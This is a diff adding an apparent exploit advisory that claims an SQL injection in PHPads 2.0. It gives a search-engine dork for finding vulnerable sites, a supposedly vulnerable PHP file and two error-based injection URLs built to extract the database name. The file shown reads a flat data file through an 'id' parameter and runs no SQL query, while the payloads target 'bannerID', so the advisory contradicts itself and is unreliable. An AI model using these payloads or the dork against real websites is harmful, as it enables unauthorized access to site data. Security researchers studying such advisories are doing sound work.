@@ -1,0 +1,56 @@
+[+] Sql Injection on PHPads Version 2.0 based on Pixelledads 1.0 by Nile Flores
+
+[+] Date: 05/05/2019
+
+[+] Risk: High
+
+[+] CWE Number : CWE-89
+
+[+] Author: Felipe Andrian Peixoto
+
+[+] Vendor Homepage: https://blondish.net/
+
+[+] Software Demo : https://github.com/blondishnet/PHPads/blob/master/readme.txt
+
+[+] Contact: felipe_andrian@hotmail.com
+
+[+] Tested on: Windows 7 and Gnu/Linux
+
+[+] Dork: inurl:"click.php3?bannerID="" // use your brain ;)
+
+[+] Exploit : 
+
+        http://host/patch//click.php3?bannerID= [SQL Injection]
+
+[+] Vulnerable File :
+
+	    <?php
+		$bannerAdsPath = './ads.dat';
+		require './ads.inc.php';
+		///////////////////////////////////////
+		// Don't Edit Anything Below This Line!
+		///////////////////////////////////////
+		for ($i = 0; $i < count($ads); $i++) {
+			if(ereg('^' .$_GET['id']. '\|\|', $ads[$i])) {
+				$data = explode('||', $ads[$i]);
+			if ($_SERVER['REMOTE_ADDR'] != $bannerAds['blockip']) {
+					$data[ PHPADS_ADELEMENT_CLICKTHRUS ]++;
+			}
+				$ads[$i] = join('||', $data);
+				break;
+			}
+		}
+		if (!$data[PHPADS_ADELEMENT_LINK_URI]) {
+			die();
+		}
+		writeads();
+		Header("Location: ". $data[PHPADS_ADELEMENT_LINK_URI]);
+		exit;
+		?>
+
+[+] PoC : 
+ 
+   http://server/phpads/click.php3?bannerID=-1/*!50000and*/+/*!50000extractvalue*/(0x0a,/*!50000concat*/(0x0a,0x73337830753a,(/*!50000select*/%20database()),0x3a7333783075))--+-
+   http:/server/phpAds/click.php3?bannerID=-1/*!50000and*/+/*!50000extractvalue*/(0x0a,/*!50000concat*/(0x0a,0x73337830753a,(/*!50000select*/%20database()),0x3a7333783075))--+-
+   
+[+] EOF
